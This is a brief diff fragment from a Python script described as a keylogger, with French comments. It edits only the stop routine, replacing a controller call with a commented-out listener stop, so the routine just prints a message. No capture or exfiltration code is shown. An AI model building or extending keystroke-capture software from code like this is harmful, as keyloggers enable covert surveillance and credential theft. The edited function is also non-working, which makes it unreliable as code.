@@ -16,8 +16,7 @@ def on_release(key):
 
 def stop_keylogger():
     # Arrêter le keylogger
-    controller = Controller()
-    controller.stop_listening()
+    #Listener.stop()
     print("Keylogger arrêté.")
 
 def listen_keyboard():
